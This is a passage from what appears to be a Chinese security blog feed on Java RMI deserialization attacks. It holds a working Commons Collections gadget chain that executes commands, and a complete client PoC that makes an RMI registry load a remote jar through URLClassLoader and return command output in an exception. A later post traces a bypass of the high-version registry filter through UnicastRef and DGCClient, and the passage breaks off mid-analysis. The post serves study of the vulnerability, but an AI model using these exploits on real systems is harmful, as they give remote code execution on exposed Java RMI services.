&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;lala&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>应该是传输Object对象过程中，需要反序列化导致的攻击吧</p>
<h2 id="npCPT">RMI进阶攻击方式</h2>
<h3 id="pmpDZ">URLClassLoader实现回显攻击</h3>
攻击注册中心时，注册中心遇到异常时，会直接把异常发回来，这里我们利用URLClassLoader远程加载jar/class文件，传入服务端，反序列化调用其任意方法，在方法内抛出错误，错误返回客户端

<p>远程Dome</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ErrorBaseExec</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doExec</span><span class="params">(String args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">exec</span> <span class="operator">=</span> Runtime.getRuntime().exec(args);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(exec.getInputStream()));</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> stringBuffer.toString();</span><br><span class="line">        <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(result);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>制作jar包命令如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac ErrorBaseExec.java</span><br><span class="line">jar -cvf RMIexploit.jar ErrorBaseExec.class</span><br></pre></td></tr></table></figure>

<p>客户端Poc如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name)</span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>; <span class="comment">//注册中心ip</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>; <span class="comment">//注册中心端口</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">remotejar</span> <span class="operator">=</span> 远程jar;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ANN_INV_HANDLER_CLASS</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(java.net.URLClassLoader.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; java.net.URL[].class &#125; &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                                            <span class="keyword">new</span> <span class="title class_">java</span>.net.URL[] &#123; <span class="keyword">new</span> <span class="title class_">java</span>.net.URL(remotejar) &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                            &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;loadClass&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;ErrorBaseExec&quot;</span> &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;do_exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125; &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125; &#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformedChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                    transformedChain);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(</span><br><span class="line">                    <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, outerMap);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(ip, port);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)</span><br><span class="line">                    .newInstance(Target.class,</span><br><span class="line">                            outerMap);</span><br><span class="line">            <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                    Remote.class.getClassLoader(),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, h));</span><br><span class="line">            registry.bind(<span class="string">&quot;liming&quot;</span>, r);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.print(e.getCause().getCause().getCause().getMessage());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ee) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741254244223-c49e5c81-2bd4-4030-a9c8-0ac6be1164fe.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741254244223-c49e5c81-2bd4-4030-a9c8-0ac6be1164fe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI之Java高版本绕过</title>
    <url>/2025/03/07/RMI%E4%B9%8BJava%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="y6jlj">RMI之Java高版本绕过</h1>
<h2 id="RoJuo">Java高版本限制</h2>

<p>在Java高版本中，在<code>RegistryImpl</code>类中新加了一个<code>registryFilter</code>方法，里面对所传入的序列化对象的类型进行了限制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (String.class == clazz</span><br><span class="line">                || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">                || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">                || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="tGZmh">绕过分析</h2>
<h3 id="i7igE">调用流程</h3>

<p>其中有希望利用的只有<code>Proxy</code>和<code>UnicastRef</code>类，其中最重要的是<code>UnicastRef</code>类，在这个类中有一个<code>invoke</code>方法 ，在修复以后，客户端的被攻击点是没有被修复的，我们就想如果能让服务端去发送一个客户端请求，就会暴露出攻击点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(RemoteCall var1)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;execute call&quot;</span>);</span><br><span class="line">            var1.executeCall();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var3) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var3);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Error var4) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;error: &quot;</span>, var4);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var5) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var5);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var6);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">throw</span> var6;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们的想法是找一个地方去调用<code>Util.createProxy</code>创建一个动态代理类，我们找到的是DGC这个类可以被利用，然后调用它的<code>clean</code>或者<code>dirty</code>方法去触发他的<code>invoke</code>方法</p>
<p>我们直接走向最终找到的<code>DGCClient</code>内部类的<code>EndpointEntry</code>的构造方法方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">EndpointEntry</span><span class="params">(<span class="keyword">final</span> Endpoint endpoint)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.endpoint = endpoint;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">LiveRef</span> <span class="variable">dgcRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, endpoint, <span class="literal">false</span>);</span><br><span class="line">                dgc = (DGC) Util.createProxy(DGCImpl.class,</span><br><span class="line">                                             <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(dgcRef), <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;internal error creating DGC stub&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            renewCleanThread =  AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">RenewCleanThread</span>(),</span><br><span class="line">                                    <span class="string">&quot;RenewClean-&quot;</span> + endpoint, <span class="literal">true</span>));</span><br><span class="line">            renewCleanThread.start();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们找哪里去创建了这么一个类，在<code>EndpointEntry</code>中的<code>lookup</code>方法中创建了这么一个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> EndpointEntry <span class="title function_">lookup</span><span class="params">(Endpoint ep)</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (endpointTable) &#123;</span><br><span class="line">                <span class="type">EndpointEntry</span> <span class="variable">entry</span> <span class="operator">=</span> endpointTable.get(ep);</span><br><span class="line">                <span class="keyword">if</span> (entry == <span class="literal">null</span>) &#123;</span><br><span class="line">                    entry = <span class="keyword">new</span> <span class="title class_">EndpointEntry</span>(ep);</span><br><span class="line">                    endpointTable.put(ep, entry);</span><br><span class="line">                    <span class="keyword">if</span> (gcLatencyRequest == <span class="literal">null</span>) &#123;</span><br><span class="line">                        gcLatencyRequest = GC.requestLatency(gcInterval);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> entry;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>我们看只有在<code>registerRefs</code>中调用了<code>EndpointEntry</code>的<code>lookup</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">(Endpoint ep, List&lt;LiveRef&gt; refs)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Look up the given endpoint and register the refs with it.</span></span><br><span class="line"><span class="comment">         * The retrieved entry may get removed from the global endpoint</span></span><br><span class="line"><span class="comment">         * table before EndpointEntry.registerRefs() is able to acquire</span></span><br><span class="line"><span class="comment">         * its lock; in this event, it returns false, and we loop and</span></span><br><span class="line"><span class="comment">         * try again.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        EndpointEntry epEntry;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            epEntry = EndpointEntry.lookup(ep);</span><br><span class="line">        &#125; <span class="keyword">while</span> (!epEntry.registerRefs(refs));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们需要找到一个反序列化利用的点，再向上找，会找到两个调用<code>registerRefs</code>的方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735285463617-0b135f12-f4cb-4beb-ae5b-b34cccb701c5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735285463617-0b135f12-f4cb-4beb-ae5b-b34cccb701c5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们看<code>read</code>方法中，如果这个输入流不是并且不继承于<code>ConnectionInputStream</code>的话，就会调用我们的<code>registerRefs</code>方法，但是这个in是一个<code>ConnectionInputStream</code>，所以我们只能去找另一个方法去利用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">stream</span> <span class="operator">=</span> (ConnectionInputStream)in;</span><br><span class="line">            <span class="comment">// save ref to send &quot;dirty&quot; call after all args/returns</span></span><br><span class="line">            <span class="comment">// have been unmarshaled.</span></span><br><span class="line">            stream.saveRef(ref);</span><br><span class="line">            <span class="keyword">if</span> (isResultStream) &#123;</span><br><span class="line">                <span class="comment">// set flag in stream indicating that remote objects were</span></span><br><span class="line">                <span class="comment">// unmarshaled.  A DGC ack should be sent by the transport.</span></span><br><span class="line">                stream.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(ep, Arrays.asList(<span class="keyword">new</span> <span class="title class_">LiveRef</span>[] &#123; ref &#125;));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>另一个最终的流程是<code>releaseInputStream</code>去调用<code>StreamRemoteCall.registerRefs</code>然后进入到if中（这个判断条件中的incomingRefTable是为空的，我们后续会说怎么走到if里面）调用<code>DGCClient.registerRefs</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">releaseInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in.done();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                in.registerRefs();</span><br><span class="line">                in.done(conn);</span><br><span class="line">            &#125;</span><br><span class="line">            conn.releaseInputStream();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            in = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!incomingRefTable.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry :</span><br><span class="line">                     incomingRefTable.entrySet()) &#123;</span><br><span class="line">                DGCClient.registerRefs(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后调用<code>releaseInputStream</code>的地方就是非常的多了，在许多Skel中都有调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286130718-449e3a84-5bfa-4b08-84a0-611bf046ed26.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286130718-449e3a84-5bfa-4b08-84a0-611bf046ed26.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后的流程如下，只要调用<code>releaseInputStream</code>，就会创建一个<code>proxy</code>对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286703216-1104471b-868f-418d-b2a7-0abdf6e93cbf.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286703216-1104471b-868f-418d-b2a7-0abdf6e93cbf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="Uf1hj">incomingRefTable赋值</h3>

<p><strong>实际上反序列化流程，只是为了给incomingRefTable赋值，攻击流程实际是在正常的调用流程中</strong></p>
<p>我们上面说过，这里的值默认是空的，要想走入<code>DGCClient.registerRefs</code>中，我们就应该去找，哪里给incomingRefTable赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!incomingRefTable.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry :</span><br><span class="line">                     incomingRefTable.entrySet()) &#123;</span><br><span class="line">                DGCClient.registerRefs(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>实际这里只有一个地方<code>ConnectionInputStream</code>的<code>saveRef</code>中，向里面put进去了一个东西，使他不为空</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">saveRef</span><span class="params">(LiveRef ref)</span> &#123;</span><br><span class="line"><span class="type">Endpoint</span> <span class="variable">ep</span> <span class="operator">=</span> ref.getEndpoint();</span><br><span class="line"></span><br><span class="line"><span class="comment">// check whether endpoint is already in the hashtable</span></span><br><span class="line">List&lt;LiveRef&gt; refList = incomingRefTable.get(ep);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (refList == <span class="literal">null</span>) &#123;</span><br><span class="line">    refList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;LiveRef&gt;();</span><br><span class="line">    incomingRefTable.put(ep, refList);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add ref to list of refs for endpoint ep</span></span><br><span class="line">refList.add(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>saveRef</code>也是只有一个地方去调用，就是<code>read</code>方法，我们之前讨论过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title function_">read</span><span class="params">(ObjectInput in, <span class="type">boolean</span> useNewFormat)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">stream</span> <span class="operator">=</span> (ConnectionInputStream)in;</span><br><span class="line">            <span class="comment">// save ref to send &quot;dirty&quot; call after all args/returns</span></span><br><span class="line">            <span class="comment">// have been unmarshaled.</span></span><br><span class="line">            stream.saveRef(ref);</span><br><span class="line">            <span class="keyword">if</span> (isResultStream) &#123;</span><br><span class="line">                <span class="comment">// set flag in stream indicating that remote objects were</span></span><br><span class="line">                <span class="comment">// unmarshaled.  A DGC ack should be sent by the transport.</span></span><br><span class="line">                stream.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(ep, Arrays.asList(<span class="keyword">new</span> <span class="title class_">LiveRef</span>[] &#123; ref &#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看看谁调用了<code>read</code>方法，只有<code>UnicastRef</code>和<code>UnicastRef2</code>中的<code>readExternal</code>去调用了<code>read</code>方法</p>
<p><code>readExternal</code>是一个和<code>readObject</code>类似但不一样的东西，如果所反序列化的类，也有<code>readExternal</code>方法，也会去调用<code>readExternal</code>方法</p>
